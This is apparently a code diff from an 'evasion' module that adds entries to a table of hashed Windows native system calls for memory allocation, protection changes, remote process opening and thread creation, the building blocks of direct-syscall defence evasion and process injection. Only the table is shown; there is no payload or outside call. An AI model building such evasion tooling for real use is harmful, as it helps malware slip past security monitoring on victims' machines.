@@ -65,12 +65,23 @@ namespace evasion {
     // Keep the registry small and append-only. Every entry costs 32
     // bytes of .data plus 21 bytes of RX shim.
     static SyscallEntry g_syscalls[] = {
-        { H("NtProtectVirtualMemory"), 0xFFFFFFFF, NULL },
-        { H("NtAllocateVirtualMemory"), 0xFFFFFFFF, NULL },
-        { H("NtWriteVirtualMemory"),    0xFFFFFFFF, NULL },
-        { H("NtCreateSection"),         0xFFFFFFFF, NULL },
-        { H("NtMapViewOfSection"),      0xFFFFFFFF, NULL },
-        { H("NtUnmapViewOfSection"),    0xFFFFFFFF, NULL },
+        { H("NtProtectVirtualMemory"),     0xFFFFFFFF, NULL },
+        { H("NtAllocateVirtualMemory"),    0xFFFFFFFF, NULL },
+        { H("NtWriteVirtualMemory"),       0xFFFFFFFF, NULL },
+        { H("NtCreateSection"),            0xFFFFFFFF, NULL },
+        { H("NtMapViewOfSection"),         0xFFFFFFFF, NULL },
+        { H("NtUnmapViewOfSection"),       0xFFFFFFFF, NULL },
+        { H("NtFreeVirtualMemory"),        0xFFFFFFFF, NULL },
+        { H("NtClose"),                    0xFFFFFFFF, NULL },
+        { H("NtWaitForSingleObject"),      0xFFFFFFFF, NULL },
+        { H("NtCreateTimer"),              0xFFFFFFFF, NULL },
+        { H("NtSetTimer"),                 0xFFFFFFFF, NULL },
+        { H("NtLockVirtualMemory"),        0xFFFFFFFF, NULL },
+        { H("NtUnlockVirtualMemory"),      0xFFFFFFFF, NULL },
+        { H("NtCreateThreadEx"),           0xFFFFFFFF, NULL },
+        { H("NtOpenProcess"),              0xFFFFFFFF, NULL },
+        { H("NtCreateMutant"),             0xFFFFFFFF, NULL },
+        { H("NtQueryPerformanceCounter"),  0xFFFFFFFF, NULL },
     };
     static const SIZE_T g_syscall_count = sizeof(g_syscalls) / sizeof(g_syscalls[0]);
 
